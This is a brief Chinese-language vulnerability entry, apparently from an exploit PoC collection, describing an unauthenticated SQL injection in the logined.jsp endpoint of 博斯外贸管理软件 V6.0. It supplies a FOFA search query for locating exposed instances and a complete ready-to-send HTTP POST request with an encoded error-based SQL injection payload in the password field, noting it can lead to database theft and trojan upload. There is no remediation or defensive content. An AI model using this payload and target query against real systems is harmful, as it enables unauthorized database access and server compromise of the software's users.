# 博斯外贸管理软件logined.jsp存在SQL注入漏洞

博斯外贸管理软件V6.0 logined.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```javascript
title="欢迎使用 博斯软件"
```

## poc
```javascript
POST /log/logined.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: keep-alive

Submit=-1&account=-1&password=1%27+AND+9085+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289085%3D9085%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29+AND+%27GSSe%27%3D%27GSSe
```

![image-20241227215420546](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272154610.png)